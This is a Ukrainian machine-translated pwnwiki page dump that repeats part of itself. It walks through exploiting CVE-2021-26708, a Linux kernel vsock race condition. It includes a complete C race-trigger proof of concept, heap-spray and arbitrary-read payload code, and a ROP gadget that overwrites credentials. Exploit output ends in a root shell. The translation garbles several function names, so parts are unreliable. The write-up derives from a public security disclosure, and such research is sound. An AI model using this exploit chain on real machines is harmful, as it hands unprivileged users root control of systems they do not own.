2. Підготуйте 2800-байтний буфер у просторі користувача та використовуйте 0x42 для memset ()

3. Використовуйте sendto () для надсилання цього буфера з клієнтського сокета в кожен серверний сокет для створення об’єктів sk_buff у kmalloc-4k. Використовуйте `sched_setaffinity () на кожному доступному процесорі

4. Виконайте довільний процес читання на vsock_sock

5. Обчисліть можливу адресу ядра sk_buff як sk_memcg плюс 4096 (наступний елемент kmalloc-4k)

6. Виконайте довільне читання цієї можливої ​​адреси sk_buff

7. Якщо ви знайшли 0x42424242424242lu в розташуванні мережевих даних, знайдіть справжній sk_buff і перейдіть до кроку 8. В іншому випадку додайте 4096 до можливої ​​адреси sk_buff і перейдіть до кроку 6

8. Виконайте розпилювач купи setxattr () &amp; userfaultfd () з 32 pthreads на sk_buff і повісьте їх на pthread_barrier

9. Довільно відпустіть адресу ядра sk_buff

10. Зателефонуйте pthread_barrier_wait (), виконайте 32 setxattr (), щоб покрити кучу розпилення pthreads skb_shared_info

11. Використовуйте recv () для отримання мережевих повідомлень із серверного сокета.

== Вільно писати через skb_shared_info ==

Нижче наведено дійсне корисне навантаження, яке замінює об’єкт sk_buff:

&lt;pre&gt;
#define SKB_SIZE        4096
#define SKB_SHINFO_OFFSET    3776
#define MY_UINFO_OFFSET        256
#define SKBTX_DEV_ZEROCOPY    (1 &lt;&lt; 3) 
void prepare_xattr_vs_skb_spray(void)
{
    struct skb_shared_info *info = NULL;

    xattr_addr = spray_data + PAGE_SIZE * 4 - SKB_SIZE + 4;

    /* Don't touch the second part to avoid breaking page fault delivery */
    memset(spray_data, 0x0, PAGE_SIZE * 4);

    info = (struct skb_shared_info *)(xattr_addr + SKB_SHINFO_OFFSET);
    info-&gt;tx_flags = SKBTX_DEV_ZEROCOPY;
    info-&gt;destructor_arg = uaf_write_value + MY_UINFO_OFFSET;

    uinfo_p = (struct ubuf_info *)(xattr_addr + MY_UINFO_OFFSET);
&lt;/pre&gt;

skb_shared_info міститься в даних ін'єкції, саме на відстані SKB_SHINFO_OFFSET, що становить 3776 байт. Покажчик skb_shared_info.destructor_arg зберігає адресу struct ubuf_info. Оскільки відома адреса ядра атакованого sk_buff, підроблений ubuf_info можна створити за адресою MY_UINFO_OFFSET у мережевому буфері. Нижче наведено схему дійсного корисного навантаження:

[[File:T0185ccbf9f025c74da.png  | 600px]]

Поговоримо про зворотний виклик destructor_arg:
&lt;pre&gt;
 /*
     * A single ROP gadget for arbitrary write:
     *   mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rdx + rcx*8], rsi ; ret
     * Here rdi stores uinfo_p address, rcx is 0, rsi is 1
     */
    uinfo_p-&gt;callback = ARBITRARY_WRITE_GADGET + kaslr_offset;
    uinfo_p-&gt;desc = owner_cred + CRED_EUID_EGID_OFFSET; /* value for "qword ptr [rdi + 8]" */
    uinfo_p-&gt;desc = uinfo_p-&gt;desc - 1; /* rsi value 1 should not get into euid */
&lt;/pre&gt;

Оскільки в vmlinuz-5.10.11-200.fc33.x86_64 я не зміг знайти гаджет, який міг би задовольнити мої потреби, я дослідив і сконструював його сам.

Покажчик функції зворотного виклику зберігає адресу гаджета ROP, RDI зберігає перший параметр функції зворотного виклику, який є адресою самого ubuf_info, а RDI + 8 вказує на ubuf_info.desc. гаджет переміщує ubuf_info.desc до RDX. Тепер RDX містить ефективний ідентифікатор користувача та адресу ідентифікатора групи мінус один байт. Цей байт дуже важливий: коли пристрій пише повідомлення 1 з RSI в пам'ять, на яку вказує RDX, ефективний uid і gid буде перезаписаний нулем. Повторюйте той самий процес, доки привілеї не буде оновлено до root. Вихідний потік усього процесу такий:
&lt;pre&gt;
[a13x@localhost ~]$ ./vsock_pwn

=================================================
==== CVE-2021-26708 PoC exploit by a13xp0p0v ====
=================================================

[+] begin as: uid=1000, euid=1000
[+] we have 2 CPUs for racing
[+] getting ready...
[+] remove old files for ftok()
[+] spray_data at 0x7f0d9111d000
[+] userfaultfd #1 is configured: start 0x7f0d91121000, len 0x1000
[+] fault_handler for uffd 38 is ready

[+] stage I: collect good msg_msg locations
[+] go racing, show wins: 
    save msg_msg ffff9125c25a4d00 in msq 11 in slot 0
    save msg_msg ffff9125c25a4640 in msq 12 in slot 1
    save msg_msg ffff9125c25a4780 in msq 22 in slot 2
    save msg_msg ffff9125c3668a40 in msq 78 in slot 3

[+] stage II: arbitrary free msg_msg using corrupted msg_msg
    kaddr for arb free: ffff9125c25a4d00
    kaddr for arb read: ffff9125c2035300
[+] adapt the msg_msg spraying payload:
    msg_ptr 0x7f0d91120fd8
    m_type 1337 at 0x7f0d91120fe8
    m_ts 6096 at 0x7f0d91120ff0
    msgseg next 0xffff9125c2035300 at 0x7f0d91120ff8
[+] go racing, show wins: 

[+] stage III: arbitrary read vsock via good overwritten msg_msg (msq 11)
[+] msgrcv returned 6096 bytes
[+] Found sk_memcg ffff9125c42f9000 (offset 4712 in the leaked kmem)
[+] Found owner cred ffff9125c3fd6e40 (offset 4888 in the leaked kmem)
[+] Found sock_def_write_space ffffffffab9851b0 (offset 4736 in the leaked kmem)
[+] Calculated kaslr offset: 2a000000

[+] stage IV: search sprayed skb near sk_memcg...
[+] checking possible skb location: ffff9125c42fa000
[+] stage IV part I: repeat arbitrary free msg_msg using corrupted msg_msg
    kaddr for arb free: ffff9125c25a4640
    kaddr for arb read: ffff9125c42fa030
[+] adapt the msg_msg spraying payload:
    msg_ptr 0x7f0d91120fd8
    m_type 1337 at 0x7f0d91120fe8
    m_ts 6096 at 0x7f0d91120ff0
    msgseg next 0xffff9125c42fa030 at 0x7f0d91120ff8
[+] go racing, show wins: 0 0 20 15 42 11 
[+] stage IV part II: arbitrary read skb via good overwritten msg_msg (msq 12)
[+] msgrcv returned 6096 bytes
[+] found a real skb

[+] stage V: try to do UAF on skb at ffff9125c42fa000
[+] skb payload:
    start at 0x7f0d91120004
    skb_shared_info at 0x7f0d91120ec4
    tx_flags 0x8
    destructor_arg 0xffff9125c42fa100
    callback 0xffffffffab64f6d4
    desc 0xffff9125c3fd6e53
[+] go racing, show wins: 15 

[+] stage VI: repeat UAF on skb at ffff9125c42fa000
[+] go racing, show wins: 0 12 13 15 3 12 4 16 17 18 9 47 5 12 13 9 13 19 9 10 13 15 12 13 15 17 30 

[+] finish as: uid=0, euid=0
[+] starting the root shell...
uid=0(root) gid=0(root) groups=0(root),1000(a13x) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
&lt;/pre&gt;

== Відео ==
&lt;youtube&gt;https://www.youtube.com/watch?v=EC8PFOYOUgU&lt;/youtube&gt;


&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==參考==
&lt;/div&gt;
https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html</text>
      <sha1>8iukgwqw301m7nowgsmegdimed0kl81</sha1>
    </revision>
    <revision>
      <id>2635</id>
      <parentid>2613</parentid>
      <timestamp>2021-05-06T02:01:38Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "На першому кроці я почав вивчати стабільне розпилення купи, яке використовувало виконання прос..."</comment>
      <origin>2635</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="32920" sha1="ry694zhkz3cz8lc07i7wgy6quns0x31" xml:space="preserve">&lt;languages  /&gt;
== Уразливість ==

Ці вразливості - це умови перегонів, спричинені неправильним блокуванням у &lt;code&gt; net / vmw_vsock / af_vsock.c &lt;/code&gt;. Ці умовні змагання були неявно представлені у поданні, яке додало підтримку мультитранспорту VSOCK у листопаді 2019 року, та були об’єднані у версію ядра Linux 5.5-rc1.

&lt;code&gt; CONFIG_VSOCKETS &lt;/code&gt; та &lt;code&gt; CONFIG_VIRTIO_VSOCKETS &lt;/code&gt; надаються як модулі ядра у всіх основних дистрибутивах GNU / Linux. Коли ви створюєте сокет для домену AF_VSOCK, ці вразливі модулі завантажуються автоматично.
&lt;pre&gt;
vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
&lt;/pre&gt;

Створення &lt;code&gt; AF_VSOCK &lt;/code&gt; сокетів доступне для непривілейованих користувачів і не вимагає простору імен користувачів.


== Пошкодження пам'яті ==

Далі наведено докладний вступ до використання CVE-2021-26708, використовуючи умовну конкуренцію в &lt;code&gt; vsock_stream_etssockopt () &lt;/code&gt;. Для відтворення потрібні два потоки. Перший потік викликає &lt;code&gt; setsockopt () &lt;/code&gt;:
&lt;pre&gt;
  setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
                &amp;size, sizeof(unsigned long));
&lt;/pre&gt;



Другий потік змінює передачу віртуального сокета, коли &lt;code&gt; vsock_stream_etssockopt () &lt;/code&gt; намагається отримати блокування сокета, повторно підключивши віртуальний сокет:
&lt;pre&gt;
struct sockaddr_vm addr = {
        .svm_family = AF_VSOCK,
    };

    addr.svm_cid = VMADDR_CID_LOCAL;
    connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

    addr.svm_cid = VMADDR_CID_HYPERVISOR;
    connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));
&lt;/pre&gt;


Для того, щоб обробити &lt;code&gt; connect () &lt;/code&gt; віртуального сокета, ядро ​​виконує &lt;code&gt; vsock_stream_connect () &lt;/code&gt;, що викликає &lt;code&gt; vsock_assign_transport () &lt;/code&gt;. Ця функція містить такий код:
&lt;pre&gt;
     if (vsk-&gt;transport) {
            if (vsk-&gt;transport == new_transport)
                return 0;

            /* transport-&gt;release() must be called with sock lock acquired.
             * This path can only be taken during vsock_stream_connect(),
             * where we have already held the sock lock.
             * In the other cases, this function is called on a new socket
             * which is not assigned to any transport.
             */
            vsk-&gt;transport-&gt;release(vsk);
            vsock_deassign_transport(vsk);
        }
&lt;/pre&gt;

&lt;code&gt; vsock_stream_connect () &lt;/code&gt; містить блокування сокета, а &lt;code&gt; vsock_stream_setsockopt () &lt;/code&gt; у паралельному потоці також намагається отримати його, що становить умовну конкуренцію. Отже, коли другий &lt;code&gt; connect () &lt;/code&gt; виконується з іншим &lt;code&gt; svm_cid &lt;/code&gt;, викликається функція &lt;code&gt; vsock_de assign_transport () &lt;/code&gt;. Ця функція виконує &lt;code&gt; virtio_transport_destruct () &lt;/code&gt;, випускає &lt;code&gt; vsock_sock.trans &lt;/code&gt;, а для &lt;code&gt; vsk-&gt; transport &lt;/code&gt; встановлено значення NULL. Коли &lt;code&gt; vsock_stream_connect () &lt;/code&gt; звільняє блокування сокета, &lt;code&gt; vsock_stream_setsockopt () &lt;/code&gt; може продовжувати виконуватися. Він викликає &lt;code&gt; vsock_update_buffer_size () &lt;/code&gt;, а потім викликає &lt;code&gt; transport-&gt; notify_buffer_size () &lt;/code&gt;. Тут транспорт містить застаріле значення з локальної змінної, яке не відповідає &lt;code&gt; vsk-&gt; транспорт &lt;/code&gt; (вихідне значення має значення NULL).

Коли ядро ​​виконує &lt;code&gt; virtio_transport_notify_buffer_size () &lt;/code&gt;, відбувається пошкодження пам'яті:
&lt;pre&gt;
void virtio_transport_notify_buffer_size(struct vsock_sock *vsk, u64 *val)
{
    struct virtio_vsock_sock *vvs = vsk-&gt;trans;

    if (*val &gt; VIRTIO_VSOCK_MAX_BUF_SIZE)
        *val = VIRTIO_VSOCK_MAX_BUF_SIZE;

    vvs-&gt;buf_alloc = *val;

    virtio_transport_send_credit_update(vsk, VIRTIO_VSOCK_TYPE_STREAM, NULL);
}
&lt;/pre&gt;

Тут vvs - це вказівник на пам’ять ядра, який був випущений у &lt;code&gt; virtio_transport_destruct () &lt;/code&gt;. Розмір &lt;code&gt; struct virtio_vsock_sock &lt;/code&gt; дорівнює 64 байтам і знаходиться в кеш-пам’яті kmalloc-64. Тип поля buf_alloc має значення u32 і знаходиться зі зміщенням 40. &lt;code&gt; VIRTIO_VSOCK_MAX_BUF_SIZE - 0xFFFFFFFFUL &lt;/code&gt;. Значення * val контролюється зловмисником, а його чотири найменш важливі байти записуються у звільнену пам'ять.


== Розмивання ==

Fuzzer syzkaller не має можливості відтворити цю аварію, тому я вирішив вивчити її сам. Але чому фуззер виходить з ладу? Дотримуйтесь &lt;code&gt; vsock_update_buffer_size () &lt;/code&gt; і дізнайтеся:
&lt;pre&gt;
 if (val != vsk-&gt;buffer_size &amp;&amp;
      transport &amp;&amp; transport-&gt;notify_buffer_size)
        transport-&gt;notify_buffer_size(vsk, &amp;val);

    vsk-&gt;buffer_size = val;

&lt;/pre&gt;

Тільки тоді, коли val відрізняється від поточного buffer_size, буде викликатися &lt;code&gt; notify_buffer_size () &lt;/code&gt;, тобто, коли &lt;code&gt; setsockopt () &lt;/code&gt; виконує &lt;code&gt; SO_VM_SOCKETS_BUFFER_SIZE &lt;/code&gt;, кожного разу Параметри розміру дзвінка повинні бути різними. Тож я створив відповідний код:
&lt;pre&gt;
/*
 * AF_VSOCK vulnerability trigger.
 * It's a PoC just for fun.
 * Author: Alexander Popov &lt;alex.popov@linux.com&gt;.
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;pthread.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;linux/vm_sockets.h&gt;
#include &lt;unistd.h&gt;

#define err_exit(msg) do { perror(msg); exit(EXIT_FAILURE); } while (0)

#define MAX_RACE_LAG_USEC 50

int vsock = -1;
int tfail = 0;
pthread_barrier_t barrier;

int thread_sync(long lag_nsec)
{
	int ret = -1;
	struct timespec ts0;
	struct timespec ts;
	long delta_nsec = 0;

	ret = pthread_barrier_wait(&amp;barrier);
	if (ret != 0 &amp;&amp; ret != PTHREAD_BARRIER_SERIAL_THREAD) {
		perror("[-] pthread_barrier_wait");
		return EXIT_FAILURE;
	}

	ret = clock_gettime(CLOCK_MONOTONIC, &amp;ts0);
	if (ret != 0) {
		perror("[-] clock_gettime");
		return EXIT_FAILURE;
	}

	while (delta_nsec &lt; lag_nsec) {
		ret = clock_gettime(CLOCK_MONOTONIC, &amp;ts);
		if (ret != 0) {
			perror("[-] clock_gettime");
			return EXIT_FAILURE;
		}

		delta_nsec = (ts.tv_sec - ts0.tv_sec) * 1000000000 +
						ts.tv_nsec - ts0.tv_nsec;
	}

	return EXIT_SUCCESS;
}

void *th_connect(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct sockaddr_vm addr = {
		.svm_family = AF_VSOCK,
	};

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	addr.svm_cid = VMADDR_CID_LOCAL;
	connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

	addr.svm_cid = VMADDR_CID_HYPERVISOR;
	connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

	return NULL;
}

void *th_setsockopt(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct timespec tp;
	unsigned long size = 0;

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	clock_gettime(CLOCK_MONOTONIC, &amp;tp);
	size = tp.tv_nsec;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
						&amp;size, sizeof(unsigned long));

	return NULL;
}

int main(void)
{
	int ret = -1;
	unsigned long size = 0;
	long loop = 0;
	pthread_t th[2] = { 0 };

	vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
	if (vsock == -1)
		err_exit("[-] open vsock");

	printf("[+] AF_VSOCK socket is opened\n");

	size = 1;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MIN_SIZE,
						&amp;size, sizeof(unsigned long));
	size = 0xfffffffffffffffdlu;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MAX_SIZE,
						&amp;size, sizeof(unsigned long));

	ret = pthread_barrier_init(&amp;barrier, NULL, 2);
	if (ret != 0)
		err_exit("[-] pthread_barrier_init");

	for (loop = 0; loop &lt; 30000; loop++) {
		long tmo1 = 0;
		long tmo2 = loop % MAX_RACE_LAG_USEC;

		printf("race loop %ld: tmo1 %ld, tmo2 %ld\n", loop, tmo1, tmo2);

		ret = pthread_create(&amp;th[0], NULL, th_connect, &amp;tmo1);
		if (ret != 0)
			err_exit("[-] pthread_create #0");

		ret = pthread_create(&amp;th[1], NULL, th_setsockopt, &amp;tmo2);
		if (ret != 0)
			err_exit("[-] pthread_create #1");

		ret = pthread_join(th[0], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #0");

		ret = pthread_join(th[1], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #1");

		if (tfail) {
			printf("[-] some thread got troubles\n");
			exit(EXIT_FAILURE);
		}
	}

	ret = close(vsock);
	if (ret)
		perror("[-] close");

	printf("[+] now see your warnings in the kernel log\n");
	return 0;
}
&lt;/pre&gt;

Значення розміру тут береться з кількості наносекунд, повернутих &lt;code&gt; clock_gettime () &lt;/code&gt;, яка може різнитися кожного разу. Оригінальний syzkaller цього не робить, оскільки коли syzkaller генерує нечіткий вхід, значення параметра syscall визначається і не буде змінюватися під час виконання.

== Ступінь чотирьох байт ==

Тут я вибираю сервер Fedora 33 як ціль дослідження, версія ядра - 5.10.11-200.fc33.x86_64, і я твердо вирішив обійти SMEP та SMAP.

На першому кроці я почав вивчати стабільне розпилення купи, яке використовувало виконання просторових дій користувача, щоб змусити ядро ​​виділити ще один 64-байтовий об'єкт у розташуванні звільненого virtio_vsock_sock. Після кількох експериментальних спроб було підтверджено, що випущений virtio_vsock_sock був перезаписаний, вказуючи на те, що обприскування купи можливо. Нарешті я знайшов msgsnd () syscall. Він створює struct msg_msg у просторі ядра, див. Вивід pahole:
&lt;pre&gt;
struct msg_msg {
    struct list_head           m_list;               /*     0    16 */
    long int                   m_type;               /*    16     8 */
    size_t                     m_ts;                 /*    24     8 */
    struct msg_msgseg *        next;                 /*    32     8 */
    void *                     security;             /*    40     8 */

    /* size: 48, cachelines: 1, members: 5 */
    /* last cacheline: 48 bytes */
};
&lt;/pre&gt;

Спереду - заголовок повідомлення, а ззаду - дані повідомлення. Якщо структура msgbuf у користувацькому просторі має 16-байтовий mtext, відповідний msg_msg буде створений у кеш-пам'яті kmalloc-64. 4-байтовий беззаписний запис зруйнує покажчик безпеки void * зі зміщенням 40. Поле msg_msg.security вказує на дані ядра, виділені lsm_msg_msg_alloc (). Коли msg_msg отримано, воно буде звільнене за допомогою security_msg_msg_free (). Отже, знищивши першу половину покажчика безпеки, можна отримати довільний безкоштовний.

== Витік інформації про ядро ​​==

Тут використовується [https://www.pwnwiki.org/index.php?title=CVE-2019-18683_Linux_kernel_through_5.3.8_%E7%89%B9%E6%AC%8A%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E CVE-2019-18683] та ж техніка. Друге з'єднання () віртуального сокета викликає &lt;code&gt; vsock_de assign_transport () &lt;/code&gt; і встановлює &lt;code&gt; vsk-&gt; transport &lt;/code&gt; на NULL, роблячи &lt;code&gt; vsock_stream_setsockopt () &lt;/code&gt; Виклик &lt;code &gt; virtio_transport_send_pkt_info () &lt;/code&gt; після збою пам'яті з'являється попередження ядра:
&lt;pre&gt;
WARNING: CPU: 1 PID: 6739 at net/vmw_vsock/virtio_transport_common.c:34
...
CPU: 1 PID: 6739 Comm: racer Tainted: G        W         5.10.11-200.fc33.x86_64 #1
Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIOS 1.13.0-2.fc32 04/01/2014
RIP: 0010:virtio_transport_send_pkt_info+0x14d/0x180 [vmw_vsock_virtio_transport_common]
...
RSP: 0018:ffffc90000d07e10 EFLAGS: 00010246
RAX: 0000000000000000 RBX: ffff888103416ac0 RCX: ffff88811e845b80
RDX: 00000000ffffffff RSI: ffffc90000d07e58 RDI: ffff888103416ac0
RBP: 0000000000000000 R08: 00000000052008af R09: 0000000000000000
R10: 0000000000000126 R11: 0000000000000000 R12: 0000000000000008
R13: ffffc90000d07e58 R14: 0000000000000000 R15: ffff888103416ac0
FS:  00007f2f123d5640(0000) GS:ffff88817bd00000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 00007f81ffc2a000 CR3: 000000011db96004 CR4: 0000000000370ee0
Call Trace:
  virtio_transport_notify_buffer_size+0x60/0x70 [vmw_vsock_virtio_transport_common]
  vsock_update_buffer_size+0x5f/0x70 [vsock]
  vsock_stream_setsockopt+0x128/0x270 [vsock]
...
&lt;/pre&gt;
За допомогою налагодження gdb виявляється, що регістр RCX містить адресу ядра звільненої virtio_vsock_sock, а регістр RBX - адресу ядра vsock_sock.

== Досягнення довільного читання ==

===From arbitrary free to use-after-free===

Звільніть об’єкт з адреси ядра, що просочилася
Виконайте розпилення купи та накрийте об’єкт контрольованими даними
Використовуйте пошкоджені об’єкти для ескалації привілеїв
Повідомлення System V, реалізоване ядром, має максимальний ліміт DATALEN_MSG, тобто PAGE_SIZE мінус sizeof (struct msg_msg)). Якщо ви надсилаєте повідомлення більшого розміру, решта повідомлень зберігаються у списку сегментів повідомлень. Msg_msg містить структуру msg_msgseg * поруч із вказівкою на перший сегмент, а size_t m_ts використовується для зберігання розміру. При виконанні операції перезапису ви можете помістити контрольоване значення в msg_msg.m_ts та msg_msg.next:

[[File:T01a51dfe7a996e854c.png | 600px ]]


Payload:
&lt;pre&gt;
    #define PAYLOAD_SZ 40 
    void adapt_xattr_vs_sysv_msg_spray(unsigned long kaddr)
    {
        struct msg_msg *msg_ptr;

        xattr_addr = spray_data + PAGE_SIZE * 4 - PAYLOAD_SZ;

        /* Don't touch the second part to avoid breaking page fault delivery */
        memset(spray_data, 0xa5, PAGE_SIZE * 4);

        printf("[+] adapt the msg_msg spraying payload:\n");
        msg_ptr = (struct msg_msg *)xattr_addr;
        msg_ptr-&gt;m_type = 0x1337;
        msg_ptr-&gt;m_ts = ARB_READ_SZ;
        msg_ptr-&gt;next = (struct msg_msgseg *)kaddr; /* set the segment ptr for arbitrary read */
        printf("\tmsg_ptr %p\n\tm_type %lx at %p\n\tm_ts %zu at %p\n\tmsgseg next %p at %p\n",
               msg_ptr,
               msg_ptr-&gt;m_type, &amp;(msg_ptr-&gt;m_type),
               msg_ptr-&gt;m_ts, &amp;(msg_ptr-&gt;m_ts),
               msg_ptr-&gt;next, &amp;(msg_ptr-&gt;next));
    }
&lt;/pre&gt;
Але як використовувати msg_msg для читання даних ядра? Читаючи документацію щодо системного виклику msgrcv (), я знайшов хороше рішення, використовуючи прапори msgrcv () та MSG:
&lt;pre&gt;
MSG_COPY (since Linux 3.8)
        Nondestructively fetch a copy of the message at the ordinal position  in  the  queue
        specified by msgtyp (messages are considered to be numbered starting at 0).
&lt;/pre&gt;
Цей прапор змушує ядро ​​копіювати дані повідомлень у користувацький простір, не видаляючи їх із черги повідомлень. Якщо ядро ​​має CONFIG_CHECKPOINT_RESTORE = y, то MSG доступний і застосовується на сервері Fedora.

=== Етапи довільного читання ===

Готовий до роботи:
Використовуйте sched_getaffinity () та CPU_COUNT () для обчислення кількості доступних процесорів (для цієї вразливості потрібно щонайменше два);
Відкрити /dev/kmsg для аналізу;
mmap () налаштовує userfaultfd () в області пам'яті spray_data як останню частину;
Запустіть окремий pthread для обробки подій userfaultfd ();
Запустіть 127 потоків для розпилювача кучі setxattr () &amp; userfaultfd () на msg_msg і повісьте їх на thread_barrier;
Отримайте адресу ядра оригінального msg_msg:
Умовна конкуренція на віртуальних сокетах;
Після другого з'єднання (), зачекайте 35 мікросекунд у зайнятому циклі;
Зателефонуйте msgsnd (), щоб створити окрему чергу повідомлень; після пошкодження пам’яті об’єкт msg_msg поміщається в положення virtio_vsock_sock;
Проаналізуйте журнал ядра та збережіть адресу ядра msg_msg із попередження ядра (регістр RCX);
Одночасно збережіть адресу ядра vsock_sock з реєстру RBX;
Використовуйте пошкоджений msg_msg, щоб виконати довільний випуск оригінального msg_msg:
Використовуйте 4 байти вихідної адреси msg_msg як SO_VM_SOCKETS_BUFFER_SIZE для досягнення пошкодження пам’яті;
Умовна конкуренція на віртуальних сокетах;
Зателефонуйте msgsnd () відразу після другого з'єднання (); msg_msg розміщується в положенні virtio_vsock_sock для досягнення знищення;
Покажчик безпеки тепер знищеного msg_msg зберігає адресу оригінального msg_msg (з кроку 2);

[[File:T01a2a2d47c9494c4a5.png | 600px ]]

Якщо під час обробки msgsnd () відбувається пошкодження пам'яті msg_msg.security з потоку setsockopt (), перевірка дозволів SELinux не вдається;
У цьому випадку msgsnd () повертає -1, а пошкоджений msg_msg знищується; випуск msg_msg.security може звільнити оригінальний msg_msg;
Перезапишіть вихідний msg_msg контрольованим корисним навантаженням:
Після того, як msgsnd () вийде з ладу, вразливість викличе pthread_barrier_wait () і викличе 127 pthreads для розпилення купи;
Ці pthreads виконують корисне навантаження setxattr ();
Початковий msg_msg замінюється керованими даними, а покажчик msg_msg.next зберігає адресу об'єкта vsock_sock;

[[File:T0140baae964febb059.png | 600px ]]

Прочитайте вміст об’єкта ядра vsock_sock до простору користувача, отримавши повідомлення з черги повідомлень, в якому зберігається перезаписаний msg_msg:
&lt;pre&gt;
ret = msgrcv(msg_locations[0].msq_id, kmem, ARB_READ_SZ, 0,
                IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
&lt;/pre&gt;

== Знайдіть ціль атаки ==

Ось пункти, які я знайшов:
1. Виділений кеш блоку, такий як PINGv6 та sock_inode_cache, має багато покажчиків на об'єкти
2. Покажчик struct mem_cgroup * sk_memcg має зміщення 664 у vsock_sock.sk. Структура mem_cgroup виділена в кеш-пам’яті kmalloc-4k.
3. Вказівник власника const struct cred * знаходиться на відстані 840 від vsock_sock.sk і зберігає адресу облікових даних, які можна перезаписати для ескалації дозволів.
4. Покажчик функції void (* sk_write_space) (struct sock *) знаходиться на відстані 688 від vsock_sock.sk і встановлюється на адресу функції ядра sock_def_write_space (). Він може бути використаний для розрахунку зміщення KASLR.

Ось як уразливість витягує ці вказівники з пам'яті:

&lt;pre&gt;
#define SK_MEMCG_RD_LOCATION    (DATALEN_MSG + SK_MEMCG_OFFSET)
#define OWNER_CRED_OFFSET    840
#define OWNER_CRED_RD_LOCATION    (DATALEN_MSG + OWNER_CRED_OFFSET)
#define SK_WRITE_SPACE_OFFSET    688
#define SK_WRITE_SPACE_RD_LOCATION (DATALEN_MSG + SK_WRITE_SPACE_OFFSET) 
/*
 * From Linux kernel 5.10.11-200.fc33.x86_64:
 *   function pointer for calculating KASLR secret
 */
#define SOCK_DEF_WRITE_SPACE    0xffffffff819851b0lu 
unsigned long sk_memcg = 0;
unsigned long owner_cred = 0;
unsigned long sock_def_write_space = 0;
unsigned long kaslr_offset = 0;

/* ... */

    sk_memcg = kmem[SK_MEMCG_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found sk_memcg %lx (offset %ld in the leaked kmem)\n",
            sk_memcg, SK_MEMCG_RD_LOCATION);

    owner_cred = kmem[OWNER_CRED_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found owner cred %lx (offset %ld in the leaked kmem)\n",
            owner_cred, OWNER_CRED_RD_LOCATION);

    sock_def_write_space = kmem[SK_WRITE_SPACE_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found sock_def_write_space %lx (offset %ld in the leaked kmem)\n",
            sock_def_write_space, SK_WRITE_SPACE_RD_LOCATION);

    kaslr_offset = sock_def_write_space - SOCK_DEF_WRITE_SPACE;
    printf("[+] Calculated kaslr offset: %lx\n", kaslr_offset);
&lt;/pre&gt;

== Впровадити Use-after-free на sk_buff ==

Мережевий буфер в ядрі Linux представлений структурою sk_buff.У цьому об’єкті є skb_shared_info та destructor_arg, які можна використовувати для викрадення потоку управління. Дані мережі та skb_shared_info розміщуються в одному блоці пам'яті ядра, на який вказує sk_buff.head. Отже, створення 2800-байтового мережевого пакету в просторі користувача призведе до того, що skb_shared_info буде виділено в кеш-пам’ять kmalloc-4k, як і об’єкт mem_cgroup.

Я побудував такі кроки:

1. Використовуйте сокети (AF_INET, SOCK_DGRAM, IPPROTO_UDP), щоб створити клієнтський сокет і 32 серверні сокети

2. Підготуйте 2800-байтний буфер у просторі користувача та використовуйте 0x42 для memset ()

3. Використовуйте sendto () для надсилання цього буфера з клієнтського сокета в кожен серверний сокет для створення об’єктів sk_buff у kmalloc-4k. Використовуйте `sched_setaffinity () на кожному доступному процесорі

4. Виконайте довільний процес читання на vsock_sock

5. Обчисліть можливу адресу ядра sk_buff як sk_memcg плюс 4096 (наступний елемент kmalloc-4k)

6. Виконайте довільне читання цієї можливої ​​адреси sk_buff

7. Якщо ви знайшли 0x42424242424242lu в розташуванні мережевих даних, знайдіть справжній sk_buff і перейдіть до кроку 8. В іншому випадку додайте 4096 до можливої ​​адреси sk_buff і перейдіть до кроку 6

8. Виконайте розпилювач купи setxattr () &amp; userfaultfd () з 32 pthreads на sk_buff і повісьте їх на pthread_barrier

9. Довільно відпустіть адресу ядра sk_buff

10. Зателефонуйте pthread_barrier_wait (), виконайте 32 setxattr (), щоб покрити кучу розпилення pthreads skb_shared_info

11. Використовуйте recv () для отримання мережевих повідомлень із серверного сокета.

== Вільно писати через skb_shared_info ==

Нижче наведено дійсне корисне навантаження, яке замінює об’єкт sk_buff:

&lt;pre&gt;
#define SKB_SIZE        4096
#define SKB_SHINFO_OFFSET    3776
#define MY_UINFO_OFFSET        256
#define SKBTX_DEV_ZEROCOPY    (1 &lt;&lt; 3) 
void prepare_xattr_vs_skb_spray(void)
{
    struct skb_shared_info *info = NULL;

    xattr_addr = spray_data + PAGE_SIZE * 4 - SKB_SIZE + 4;

    /* Don't touch the second part to avoid breaking page fault delivery */
    memset(spray_data, 0x0, PAGE_SIZE * 4);

